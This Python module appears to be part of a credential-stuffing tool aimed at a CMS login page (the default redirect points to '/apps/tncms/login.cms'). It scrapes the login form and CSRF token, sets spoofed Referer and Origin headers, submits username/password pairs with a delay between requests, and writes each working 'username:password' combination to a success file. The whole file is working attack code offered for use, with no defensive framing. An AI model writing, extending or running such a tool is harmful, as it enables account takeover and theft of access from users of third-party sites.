import time
import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin
from typing import Optional, Set, Tuple, Dict
from utils.files_read_write_utils import save_to_file
from settings import (
    LOGIN_PAGE_URL,
    LOGIN_POST_URL,
    DEFAULT_SESSION_HEADERS,
    SUCCESS_FILE_PATH,
    USERNAME_PARAM_STRING,
    PASSWORD_PARAM_STRING,
    CSRF_PARAM_STRING,
    DELAY_BETWEEN_REQUESTS,
)


def create_session() -> Optional[requests.Session]:
    """
    Create a requests.Session with full headers and verify login page accessibility.

    Returns:
        Optional[requests.Session]: Configured session if reachable, else None.
    """
    session = requests.Session()
    session.headers.update(DEFAULT_SESSION_HEADERS)
    try:
        r = session.get(LOGIN_PAGE_URL, timeout=10)
        if r.status_code != 200:
            print(f"[!] Server returned status: {r.status_code}")
            return None
    except requests.RequestException as e:
        print(f"[!] Connection error: {e}")
        return None
    return session


def fetch_login_form(session: requests.Session) -> Tuple[str, Dict[str, str]]:
    """
    Fetch login page and extract form action and input values.

    Args:
        session (requests.Session): Active session.

    Returns:
        Tuple[str, Dict[str, str]]: (post_url, form_values)
    """
    r = session.get(LOGIN_PAGE_URL, timeout=10)
    soup = BeautifulSoup(r.text, "html.parser")
    form = soup.find("form")
    post_url = urljoin(LOGIN_PAGE_URL, form.get("action")) if form and form.get("action") else LOGIN_POST_URL
    form_values = {inp.get("name"): inp.get("value", "") for inp in form.find_all("input") if inp.get("name")} if form else {}
    return post_url, form_values


def extract_csrf(form_values: Dict[str, str]) -> Optional[str]:
    """
    Extract CSRF token from form values using standard or alternative keys.

    Args:
        form_values (Dict[str, str]): Dictionary of form inputs.

    Returns:
        Optional[str]: CSRF token if found, else None.
    """
    if CSRF_PARAM_STRING in form_values:
        return form_values[CSRF_PARAM_STRING]
    for alt in ("csrf_token", "_csrf", "token"):
        if alt in form_values:
            return form_values[alt]
    return None


def try_login(session: requests.Session, known_success: Set[str], username: str, password: str) -> bool:
    """
    Attempt login using provided credentials and save successful attempts.

    Args:
        session (requests.Session): Active HTTP session.
        known_success (Set[str]): Set of previously successful combos.
        username (str): Username to try.
        password (str): Password to try.

    Returns:
        bool: True if login succeeded, False otherwise.
    """
    post_url, form_values = fetch_login_form(session)

    payload = {
        USERNAME_PARAM_STRING: username,
        PASSWORD_PARAM_STRING: password,
        "redirect": form_values.get("redirect", "/apps/tncms/login.cms")
    }

    csrf_val = extract_csrf(form_values)
    if csrf_val:
        payload[CSRF_PARAM_STRING] = csrf_val

    # Ustawienie Referer i Origin
    session.headers.update({
        "Referer": LOGIN_PAGE_URL,
        "Origin": f"https://{LOGIN_PAGE_URL.split('://')[1].split('/')[0]}"
    })

    try:
        resp = session.post(post_url, data=payload, timeout=15)
        time.sleep(DELAY_BETWEEN_REQUESTS)

        if resp.status_code != 200:
            print(f"[!] Unexpected status {resp.status_code} for {username}:{password}")
            return False

        try:
            response_json = resp.json()
        except ValueError:
            print(f"[!] Non-JSON response for {username}:{password}")
            return False

        if not response_json.get("error"):
            combo = f"{username}:{password}"
            if combo not in known_success:
                save_to_file(SUCCESS_FILE_PATH, combo)
                known_success.add(combo)
            print(f"[+] Success: {combo}")
            return True

    except requests.RequestException as e:
        print(f"[!] Request error for {username}:{password} -> {e}")
    except Exception as e:
        print(f"[!] Unexpected error for {username}:{password} -> {e}")

    return False
